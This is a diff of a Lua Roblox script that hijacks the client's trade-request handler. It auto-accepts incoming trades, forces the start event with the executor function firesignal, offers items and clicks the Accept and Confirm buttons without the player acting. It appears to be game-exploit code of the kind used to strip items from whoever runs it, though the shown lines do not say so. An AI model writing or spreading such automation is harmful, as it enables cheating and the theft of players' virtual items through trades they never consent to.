@@ -32,11 +32,11 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             end
         end
 
-        AcceptRequest:FireServer()
+        pcall(function()
+            AcceptRequest:FireServer()
+        end)
         
         task.spawn(function()
-            print("Waiting for trade to start...")
-            
             pcall(function()
                 if firesignal then
                     firesignal(StartTradeEvent.OnClientEvent, {
@@ -48,12 +48,9 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end)
             
-            local successWait = pcall(function()
+            pcall(function()
                 StartTradeEvent.OnClientEvent:Wait()
             end)
-            if not successWait then
-                task.wait(1)
-            end
             
             print("Trade started! Waiting 1 second before offering items...")
             task.wait(1)
@@ -159,30 +156,12 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end
 
-            -- Try phone layout path first
-            local phoneSuccess = pcall(function()
+            pcall(function()
                 local phoneActions = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Actions
                 fireButton(phoneActions.Accept.ActionButton)
                 task.wait(1)
                 fireButton(phoneActions.Accept.Confirm.ActionButton)
             end)
-
-            if not phoneSuccess then
-                -- Fallback to standard TradeGUI path traversal if phone UI doesn't exist
-                if playerGui then
-                    local tradeGui = playerGui:FindFirstChild("TradeGUI")
-                    if tradeGui then
-                        for _, gui in ipairs(tradeGui:GetDescendants()) do
-                            if gui:IsA("GuiButton") then
-                                local fullName = gui:GetFullName():lower()
-                                if fullName:find("accept") or fullName:find("confirm") or fullName:find("actionbutton") then
-                                    fireButton(gui)
-                                end
-                            end
-                        end
-                    end
-                end
-            end
         end)
 
         return true
